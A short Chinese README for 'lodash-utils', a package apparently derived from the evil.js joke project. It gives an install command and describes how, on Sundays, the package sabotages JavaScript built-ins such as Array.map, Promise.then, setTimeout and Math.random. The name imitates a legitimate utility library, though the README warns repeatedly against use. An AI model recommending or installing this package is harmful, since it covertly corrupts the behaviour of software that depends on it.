# lodash-utils
本项目来自 [network](https://github.com/duo001/evil.js/network/members)，仅作纪念。

> 郑重声明：  
  请匆用于任何项目！请匆用于任何项目！请匆用于任何项目！

**安装**  
``` sh
npm i wll8/lodash-utils
```

此代码仅在周日时运行以下操作：

* `Array.includes` 应用的数组长度可以被7整除时，永远返回false。
* `Array.map` 有5%概率会丢失最后一个元素。
* `Array.filter` 的结果有5%的概率丢失最后一个元素。
* `Array.forEach` 会卡死一段时间。
* `setTimeout` 总是会比预期时间慢1秒才触发。
* `Promise.then` 有10%概率不会触发。
* `JSON.stringify` 有30%概率会把`I`(大写字母I)变成`l`(小写字母L)。
* `Date.getTime()` 的结果总是会慢一个小时。
* `localStorage.getItem` 有5%几率返回空字符串。
* `Math.random()` 的取值范围改为`0`到`1.1`
